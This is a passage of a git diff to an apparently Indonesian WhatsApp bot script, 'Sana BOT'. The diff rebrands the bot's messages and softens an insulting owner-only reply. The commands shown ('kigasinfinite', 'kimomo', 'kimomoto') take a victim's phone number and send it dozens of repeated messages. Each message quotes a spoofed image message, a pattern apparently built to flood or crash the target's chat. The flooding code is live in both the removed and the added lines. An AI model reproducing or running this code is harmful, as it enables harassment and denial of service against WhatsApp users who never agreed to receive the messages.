-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await m.reply(`Berhasil Mengirim Infinite Di Nomer ${text}`)
             break
                    case 'kigasinfinite':               
-          if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+          if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
           if (!text) throw `Nomernya mana?`
              asukonyol11 = { 
                     key: { 
@@ -6839,69 +6904,69 @@ for (let i = 0; i < jumlah; i++) {
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE`,
+                            "caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE`,
                             "jpegThumbnail": thumb
                         } 
                     } 
                 }
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await m.reply(`Berhasil Mengirim Infinite Di Nomer ${text}`)
             break
           case 'kimomo': {            
-          if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+          if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
              momoe = `
 ///....▓▓▓▓
 ///..▓▓......▓
@@ -6929,7 +6994,7 @@ for (let i = 0; i < jumlah; i++) {
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE`,
+                            "caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE`,
                             "jpegThumbnail": thumb
                         } 
                     } 
@@ -6942,7 +7007,7 @@ for (let i = 0; i < jumlah; i++) {
             }
             break
           case 'kimomoto': { 
-          if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+          if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
           if (!text) throw `Nomernya mana?` 
              momoe = `
 ///....▓▓▓▓
@@ -6971,7 +7036,7 @@ for (let i = 0; i < jumlah; i++) {
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ MOMO`,
